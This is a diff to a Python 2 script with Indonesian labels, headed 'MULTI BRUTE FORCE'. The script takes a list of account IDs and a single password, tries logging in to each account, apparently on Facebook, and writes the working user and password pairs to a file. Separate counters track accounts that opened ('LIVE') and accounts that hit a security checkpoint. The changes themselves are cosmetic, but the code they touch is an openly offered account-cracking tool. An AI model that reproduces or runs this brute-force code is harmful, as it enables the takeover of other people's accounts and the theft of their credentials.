@@ -18,11 +18,12 @@ count = 0
 dados = []
 gagal = []
 oradadi = []
+threads = []
 
 def mbf():
 
     global file_id, password
-    global listID, 
+    global listID
 
     try:
         token = open("token.txt", "r")
@@ -31,11 +32,14 @@ def mbf():
         print m+" Token Tidak Ada"
         os.system("rm -f token.txt")
     else:
+        os.system('clear')
+        print
         print pu+"+==============================+"
         print a+"|       MULTI BRUTE FORCE      |"
         print pu+"+==============================+"
         file_id = raw_input(h+" [+] Masukkan File ID:" + k + " ")
         password = raw_input(h+" [+] Masukkan Password:" + k + " ")
+        print
         try:
             listID = open(file_id, "r")
             for ival in range(30):
@@ -52,9 +56,10 @@ def mbf():
 
 def mbfcrack():
     
+    global baris
     global dados, gagal
     global oradadi, count
-
+    
     try:
         data_lis = open(file_id, "r")
         baris = data_lis.read().split()
@@ -68,7 +73,7 @@ def mbfcrack():
             if "access_token" in jsl:
                 sukses = open("Dadi.txt", 'w')
                 sukses.write(user + " | " + password + "\n")
-                dados.append(h+" [+]" + pu + user + " | " + a + password)
+                dados.append(h+" [OK]" + pu + user + " | " + a + password)
                 count =+ 1
             else:
                 if "www.facebook" in jsl["error_msg"]:
@@ -79,7 +84,7 @@ def mbfcrack():
                 else:
                     oradadi.append(user)
                     count += 1
-            sys.stdout.write(a+ " [$] Crack " + str(count) + " => " + str(len(baris)) + " => LIVE= " + str(len(dados)) + " | CEKPO= " + str(len(gagal)))
+            sys.stdout.write(a+ "\r [$] Crack " + str(count) + " => " + str(len(baris)) + " => LIVE= " + str(len(dados)) + " | CEKPO= " + str(len(gagal)))
             sys.stdout.flush()
 
     except IOError:
@@ -90,8 +95,10 @@ def hasil_crack():
     print
 
     for ipal in dados:
+        print 
         print ipal
     for ival in gagal:
+        print 
         print ival
 
     print 
